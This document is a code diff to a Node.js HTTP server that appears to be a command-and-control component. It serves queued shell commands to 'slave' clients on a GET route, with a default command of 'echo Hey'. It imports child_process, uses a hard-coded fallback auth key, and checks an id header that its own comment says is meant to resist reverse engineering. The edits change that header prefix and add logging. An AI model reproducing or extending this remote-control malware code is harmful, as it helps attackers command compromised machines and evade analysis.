@@ -1,9 +1,9 @@
 const http = require('http');
-const PORT = process.env.rrPORT || 14123;
+const PORT = process.env.PORT|| 14123;
 const system = require('child_process')
 const fs = require('fs')
 
-let inp = ""
+let inp = "echo Hey\n"
 let auth_key = process.env.auth || "1234"
 
 const reset = () => {
@@ -21,6 +21,7 @@ const auth = (req, res) => {
 
 const server = http.createServer((req, res) => {
     //basic slave route
+    console.log(req.method)
     if (req.url === '/' && req.method === 'GET') {
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         res.end(inp);
@@ -31,9 +32,11 @@ const server = http.createServer((req, res) => {
             req.end("No id provided")
             return
         }
-        else if (!req.headers.id.startsWith('çççç')) { //tiny self-preservation from reverse engineering
+        else if (!req.headers.id.startsWith('sts')) { //tiny self-preservation from reverse engineering
+            console.log(req.headers.id)
             res.writeHead(200, { 'Content-Type': 'text/plain' });
             res.end("ok")
+            return
         }
 
         let buffer = ''
